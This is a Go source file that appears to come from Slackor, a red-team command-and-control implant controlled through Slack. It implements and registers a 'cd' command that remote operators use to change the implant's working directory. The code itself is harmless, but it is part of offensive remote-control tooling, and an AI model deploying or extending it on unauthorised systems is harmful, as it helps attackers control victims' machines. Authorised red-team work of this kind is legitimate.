package common

import (
	"errors"
	"os"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// CD changes the current working directory
type CD struct{}

// Name is the name of the command
func (c CD) Name() string {
	return "cd"
}

// Run changes the current working directory
func (c CD) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("cd takes 1 argument")
	}
	os.Chdir(args[0])
	return os.Getwd()
}

func init() {
	command.RegisterCommand(CD{})
}
